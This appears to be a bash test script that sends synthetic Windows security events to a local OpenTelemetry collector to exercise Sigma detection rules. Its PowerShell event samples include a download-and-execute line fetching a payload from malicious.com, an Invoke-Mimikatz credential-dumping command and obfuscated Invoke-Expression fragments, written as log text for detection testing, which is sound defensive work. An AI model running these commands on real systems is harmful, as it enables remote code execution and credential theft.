#!/bin/bash

# Test Script: Generate OTEL events that match Sigma rules
# This script sends synthetic security events to the OTEL collector HTTP endpoint

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
OTEL_COLLECTOR_URL="${OTEL_COLLECTOR_URL:-http://localhost:4318/v1/logs}"
NUM_EVENTS="${1:-100}"
BATCH_SIZE=10
DELAY_BETWEEN_BATCHES=0.5

print_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

print_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

print_success() {
    echo -e "${BLUE}[SUCCESS]${NC} $1"
}

# Check if jq is available for JSON formatting
if ! command -v jq &> /dev/null; then
    print_warn "jq not found. Install for better output formatting: apt-get install jq"
fi

# Test event templates that should match Sigma rules
generate_failed_login_event() {
    local timestamp=$(date +%s%N)
    local username="user$((RANDOM % 100))"
    local ip="192.168.1.$((RANDOM % 255))"
    local hostname="server$((RANDOM % 10))"

    cat <<EOF
{
  "resourceLogs": [{
    "resource": {
      "attributes": [
        {"key": "service.name", "value": {"stringValue": "windows-security"}},
        {"key": "host.name", "value": {"stringValue": "$hostname"}},
        {"key": "os.type", "value": {"stringValue": "windows"}}
      ]
    },
    "scopeLogs": [{
      "scope": {"name": "security-events"},
      "logRecords": [{
        "timeUnixNano": "$timestamp",
        "severityText": "WARN",
        "severityNumber": 13,
        "body": {
          "stringValue": "{\"EventID\": 4625, \"Channel\": \"Security\", \"EventData\": {\"TargetUserName\": \"$username\", \"IpAddress\": \"$ip\", \"FailureReason\": \"Bad password\"}}"
        },
        "attributes": [
          {"key": "event.category", "value": {"stringValue": "authentication"}},
          {"key": "event.action", "value": {"stringValue": "logon-failed"}}
        ]
      }]
    }]
  }]
}
EOF
}

generate_mimikatz_detection_event() {
    local timestamp=$(date +%s%N)
    local hostname="victim-pc$((RANDOM % 5))"
    local process_id=$((RANDOM % 10000))

    cat <<EOF
{
  "resourceLogs": [{
    "resource": {
      "attributes": [
        {"key": "service.name", "value": {"stringValue": "windows-security"}},
        {"key": "host.name", "value": {"stringValue": "$hostname"}},
        {"key": "os.type", "value": {"stringValue": "windows"}}
      ]
    },
    "scopeLogs": [{
      "scope": {"name": "security-events"},
      "logRecords": [{
        "timeUnixNano": "$timestamp",
        "severityText": "CRITICAL",
        "severityNumber": 21,
        "body": {
          "stringValue": "{\"EventID\": 10, \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"EventData\": {\"SourceImage\": \"C:\\\\\\\\Users\\\\\\\\admin\\\\\\\\mimikatz.exe\", \"TargetImage\": \"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\lsass.exe\", \"GrantedAccess\": \"0x1010\", \"SourceProcessId\": \"$process_id\"}}"
        },
        "attributes": [
          {"key": "event.category", "value": {"stringValue": "process"}},
          {"key": "event.action", "value": {"stringValue": "process-access"}}
        ]
      }]
    }]
  }]
}
EOF
}

generate_powershell_suspicious_event() {
    local timestamp=$(date +%s%N)
    local hostname="workstation$((RANDOM % 20))"
    local script_blocks=(
        "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')"
        "Invoke-Mimikatz -DumpCreds"
        "powershell -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
        "Invoke-Expression \\\$(New-Object IO.StreamReader (\\\$(New-Object IO.Compression.DeflateStream"
    )
    local script="${script_blocks[$((RANDOM % ${#script_blocks[@]}))]}"

    cat <<EOF
{
  "resourceLogs": [{
    "resource": {
      "attributes": [
        {"key": "service.name", "value": {"stringValue": "windows-powershell"}},
        {"key": "host.name", "value": {"stringValue": "$hostname"}},
        {"key": "os.type", "value": {"stringValue": "windows"}}
      ]
    },
    "scopeLogs": [{
      "scope": {"name": "powershell-events"},
      "logRecords": [{
        "timeUnixNano": "$timestamp",
        "severityText": "ERROR",
        "severityNumber": 17,
        "body": {
          "stringValue": "{\"EventID\": 4104, \"Channel\": \"Microsoft-Windows-PowerShell/Operational\", \"ScriptBlockText\": \"$script\", \"Path\": \"C:\\\\\\\\Users\\\\\\\\admin\\\\\\\\malicious.ps1\"}"
        },
        "attributes": [
          {"key": "event.category", "value": {"stringValue": "process"}},
          {"key": "event.action", "value": {"stringValue": "script-execution"}}
        ]
      }]
    }]
  }]
}
EOF
}

generate_privilege_escalation_event() {
    local timestamp=$(date +%s%N)
    local hostname="dc$((RANDOM % 3))"
    local username="user$((RANDOM % 50))"
    local admin_group="Administrators"

    cat <<EOF
{
  "resourceLogs": [{
    "resource": {
      "attributes": [
        {"key": "service.name", "value": {"stringValue": "windows-security"}},
        {"key": "host.name", "value": {"stringValue": "$hostname"}},
        {"key": "os.type", "value": {"stringValue": "windows"}}
      ]
    },
    "scopeLogs": [{
      "scope": {"name": "security-events"},
      "logRecords": [{
        "timeUnixNano": "$timestamp",
        "severityText": "ERROR",
        "severityNumber": 17,
        "body": {
          "stringValue": "{\"EventID\": 4728, \"Channel\": \"Security\", \"EventData\": {\"MemberName\": \"$username\", \"TargetUserName\": \"$admin_group\", \"SubjectUserName\": \"admin\"}}"
        },
        "attributes": [
          {"key": "event.category", "value": {"stringValue": "iam"}},
          {"key": "event.action", "value": {"stringValue": "group-member-added"}}
        ]
      }]
    }]
  }]
}
EOF
}

generate_lateral_movement_event() {
    local timestamp=$(date +%s%N)
    local hostname="server$((RANDOM % 20))"
    local source_ip="10.0.0.$((RANDOM % 255))"
    local username="admin$((RANDOM % 5))"

    cat <<EOF
{
  "resourceLogs": [{
    "resource": {
      "attributes": [
        {"key": "service.name", "value": {"stringValue": "windows-security"}},
        {"key": "host.name", "value": {"stringValue": "$hostname"}},
        {"key": "os.type", "value": {"stringValue": "windows"}}
      ]
    },
    "scopeLogs": [{
      "scope": {"name": "security-events"},
      "logRecords": [{
        "timeUnixNano": "$timestamp",
        "severityText": "WARN",
        "severityNumber": 13,
        "body": {
          "stringValue": "{\"EventID\": 4624, \"Channel\": \"Security\", \"EventData\": {\"TargetUserName\": \"$username\", \"IpAddress\": \"$source_ip\", \"LogonType\": \"3\", \"AuthenticationPackageName\": \"NTLM\"}}"
        },
        "attributes": [
          {"key": "event.category", "value": {"stringValue": "authentication"}},
          {"key": "event.action", "value": {"stringValue": "logon-success"}}
        ]
      }]
    }]
  }]
}
EOF
}

# Event type distribution
EVENT_TYPES=(
    "failed_login:40"          # 40% failed logins (EventID 4625)
    "mimikatz:15"              # 15% mimikatz detection (EventID 10)
    "powershell:20"            # 20% suspicious PowerShell (EventID 4104)
    "privilege_escalation:15"  # 15% privilege escalation (EventID 4728)
    "lateral_movement:10"      # 10% lateral movement (EventID 4624)
)

# Calculate weighted random event type
get_random_event_type() {
    local rand=$((RANDOM % 100))
    local cumulative=0

    for entry in "${EVENT_TYPES[@]}"; do
        local type="${entry%%:*}"
        local weight="${entry##*:}"
        cumulative=$((cumulative + weight))

        if [ $rand -lt $cumulative ]; then
            echo "$type"
            return
        fi
    done

    echo "failed_login"  # Default
}

# Generate event based on type
generate_event() {
    local event_type="$1"

    case "$event_type" in
        failed_login)
            generate_failed_login_event
            ;;
        mimikatz)
            generate_mimikatz_detection_event
            ;;
        powershell)
            generate_powershell_suspicious_event
            ;;
        privilege_escalation)
            generate_privilege_escalation_event
            ;;
        lateral_movement)
            generate_lateral_movement_event
            ;;
        *)
            generate_failed_login_event
            ;;
    esac
}

# Send event to OTEL collector
send_event() {
    local payload="$1"
    local event_num="$2"

    response=$(curl -s -w "\n%{http_code}" -X POST "$OTEL_COLLECTOR_URL" \
        -H "Content-Type: application/json" \
        -d "$payload" 2>&1)

    http_code=$(echo "$response" | tail -n 1)

    if [ "$http_code" = "200" ] || [ "$http_code" = "202" ]; then
        return 0
    else
        print_error "Event $event_num failed with HTTP $http_code"
        return 1
    fi
}

# Main execution
main() {
    print_info "=========================================="
    print_info "OTEL Security Event Generator"
    print_info "=========================================="
    print_info "Target: $OTEL_COLLECTOR_URL"
    print_info "Events to generate: $NUM_EVENTS"
    print_info "Batch size: $BATCH_SIZE"
    echo ""

    # Test collector connectivity
    print_info "Testing OTEL collector connectivity..."
    if ! curl -s --connect-timeout 5 "$OTEL_COLLECTOR_URL" > /dev/null 2>&1; then
        print_error "Cannot reach OTEL collector at $OTEL_COLLECTOR_URL"
        print_warn "Make sure the collector is running and accessible"
        exit 1
    fi
    print_success "OTEL collector is reachable"
    echo ""

    # Event counters
    declare -A event_counts
    local sent_count=0
    local failed_count=0

    print_info "Generating and sending events..."

    for ((i=1; i<=NUM_EVENTS; i++)); do
        event_type=$(get_random_event_type)
        event_counts[$event_type]=$((${event_counts[$event_type]:-0} + 1))

        payload=$(generate_event "$event_type")

        if send_event "$payload" "$i"; then
            sent_count=$((sent_count + 1))
            printf "\r${GREEN}[✓]${NC} Sent: %d/%d (Failed: %d)" "$sent_count" "$NUM_EVENTS" "$failed_count"
        else
            failed_count=$((failed_count + 1))
            printf "\r${RED}[✗]${NC} Sent: %d/%d (Failed: %d)" "$sent_count" "$NUM_EVENTS" "$failed_count"
        fi

        # Add delay after each batch
        if [ $((i % BATCH_SIZE)) -eq 0 ]; then
            sleep "$DELAY_BETWEEN_BATCHES"
        fi
    done

    echo ""
    echo ""
    print_info "=========================================="
    print_success "Event Generation Complete!"
    print_info "=========================================="
    print_info "Total events sent: $sent_count/$NUM_EVENTS"
    print_info "Failed: $failed_count"
    echo ""
    print_info "Event Distribution:"
    for event_type in "${!event_counts[@]}"; do
        printf "  %-25s %d events\n" "$event_type:" "${event_counts[$event_type]}"
    done
    echo ""

    print_info "Event Types & Expected Sigma Matches:"
    echo "  • failed_login (EventID 4625)           → Failed Authentication"
    echo "  • mimikatz (EventID 10)                 → Credential Dumping"
    echo "  • powershell (EventID 4104)             → Suspicious Script Execution"
    echo "  • privilege_escalation (EventID 4728)   → Privilege Escalation"
    echo "  • lateral_movement (EventID 4624)       → Lateral Movement"
    echo ""

    print_info "Next Steps:"
    print_info "1. Wait 5-10 seconds for ClickHouse ingestion"
    print_info "2. Check security-analyzer logs:"
    print_info "   docker-compose logs -f security-analyzer | grep -i alert"
    print_info "3. Verify alerts in Keep platform"
    print_info "4. Check ClickHouse for ingested logs:"
    print_info "   clickhouse-client --query 'SELECT count() FROM signoz_logs.logs_v2 WHERE timestamp > now() - INTERVAL 1 MINUTE'"
    echo ""
}

# Handle Ctrl+C gracefully
trap 'echo ""; print_warn "Interrupted by user"; exit 130' INT

main "$@"
